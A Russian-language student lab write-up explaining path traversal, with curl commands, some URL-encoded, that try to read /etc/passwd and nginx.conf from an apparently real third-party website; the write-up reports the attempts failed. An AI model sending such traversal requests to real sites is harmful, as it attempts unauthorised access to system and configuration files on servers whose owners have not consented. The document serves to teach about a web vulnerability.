# Лабораторная работа №1 - со звёздочкой :star2:
![meme1](https://github.com/MkrtchyanKarina/DevOps_labs/blob/master/lab1_extra/img/meme1.jpg)
## Path traversal (обход пути)
*Уязвимость в веб-приложениях, позволяющая злоумышленнику получить несанкционированный доступ к файлам и директориям на сервере, находящимся за пределами разрешенного корневого каталога.*
1. Установим curl 
```
winget install curl.curl
```

2. Попытаемся сделать обход и получить доступ к системным файлам
```
curl -Uri "https://dshi46.ru/../../../../etc/passwd" | select -First 5
```
> Файл /etc/passwd содержит следующие записи, разделенные двоеточиями:
  > - Имя пользователя
  > - Зашифрованный пароль
  > - Цифровой идентификатор пользователя (UID)
  > - Цифровой идентификатор группы пользователя (GID)
  > - Полное имя пользователя (GECOS)
  > - Домашний каталог пользователя
  > - Оболочка входа в систему

![res1](https://github.com/MkrtchyanKarina/DevOps_labs/blob/master/lab1_extra/img/res1.png)

Попробуем закодировать символы ( %2f = / и, если сервер вдруг на Windows: %5c = \ ), а также получить файл с конфигурациями nginx
```
curl -Uri "https://dshi46.ru/..%2f..%2f..%2f..%2fetc%2fpasswd" | select -First 5
curl -Uri "https://dshi46.ru/..%5c..%5c..%5c..%5cetc%2fpasswd" | select -First 5
curl -Uri "https://dshi46.ru/..%2f..%2f..%2fetc%2fnginx%2fnginx.conf" | select -First 5
```

![res2](https://github.com/MkrtchyanKarina/DevOps_labs/blob/master/lab1_extra/img/res2.png)

Как видим, доступ получить не удалось :(
